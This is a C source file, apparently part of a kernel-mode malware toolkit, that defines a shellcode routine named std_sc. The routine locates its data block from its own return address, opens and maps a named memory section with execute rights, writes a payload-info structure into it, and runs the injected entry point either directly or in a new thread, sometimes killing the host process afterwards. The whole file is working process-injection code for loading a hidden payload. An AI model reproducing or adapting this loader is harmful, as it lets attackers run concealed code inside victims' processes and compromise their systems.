#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "../../../../shared/types.h"
#include "../../../../shared/pe.h"
#include "../../../code/sc_defines.h"


typedef void* (*FnOpenFileMappingA)(uint32_t dwDesiredAccess, BOOLEAN bInheritHandle, const char* lpName);
typedef void* (*FnMapViewOfFile)(void* hFileMappingObject, uint32_t dwDesiredAccess, uint32_t dwFileOffsetHigh, uint32_t dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
typedef int (*FnUnmapViewOfFile)(const void* lpBaseAddress);
typedef void* (*FnCreateThread)(void* lpThread, SIZE_T dwStackSize, void* lpAddress, void* lpParameter, uint32_t dwFlags, uint32_t* lpThreadId);
typedef void (*FnTerminateProcess)(void* hHandle, uint32_t uExitCode);
typedef int (*FnCloseHandle)(void* hHandle);

#define SECTION_QUERY                0x0001
#define SECTION_MAP_WRITE            0x0002
#define SECTION_MAP_READ             0x0004
#define SECTION_MAP_EXECUTE          0x0008
#define SECTION_EXTEND_SIZE          0x0010
#define SECTION_MAP_EXECUTE_EXPLICIT 0x0020 // not included in SECTION_ALL_ACCESS

#define FILE_MAP_COPY       SECTION_QUERY
#define FILE_MAP_WRITE      SECTION_MAP_WRITE
#define FILE_MAP_READ       SECTION_MAP_READ
#define FILE_MAP_ALL_ACCESS SECTION_ALL_ACCESS
#define FILE_MAP_EXECUTE    SECTION_MAP_EXECUTE_EXPLICIT    // not included in FILE_MAP_ALL_ACCESS

typedef void (*Fnisyspf)(PVOID imageBase);

void std_sc()
{
    HANDLE hMapping;
    PVOID pMapping;
    pstd_shellcode_data pScData;

    pScData = (pstd_shellcode_data)((uint8_t*)_ReturnAddress() + 1);

    if (hMapping = ((FnOpenFileMappingA)pScData->fnOpenFileMappingA.ptr)(FILE_MAP_READ|FILE_MAP_WRITE|FILE_MAP_EXECUTE, FALSE, pScData->mappingName)) {
        if (pMapping = ((FnMapViewOfFile)pScData->fnMapViewOfFile.ptr)(hMapping, FILE_MAP_READ|FILE_MAP_WRITE|FILE_MAP_EXECUTE, 0, 0, 0)) {
            Fnisyspf fnisyspf = (Fnisyspf)RtlOffsetToPointer(pMapping, pScData->injectEntryRva);
            
            __movsb(RtlOffsetToPointer(pMapping, pScData->piEntryRva), (uint8_t*)&pScData->pi, sizeof(payload_info_t));

            if (pScData->needTerminate) {
                fnisyspf(pMapping);
                ((FnUnmapViewOfFile)pScData->fnUnmapViewOfFile.ptr)(pMapping);
            }
            else {
                ((FnCreateThread)pScData->fnCreateThread.ptr)(NULL, 0, fnisyspf, pMapping, 0, NULL);
            }
        }

        ((FnCloseHandle)pScData->fnCloseHandle.ptr)(hMapping);
    }

    if (pScData->needTerminate) {
        ((FnTerminateProcess)pScData->fnTerminateProcess.ptr)((void*)-1, 0);
    }
}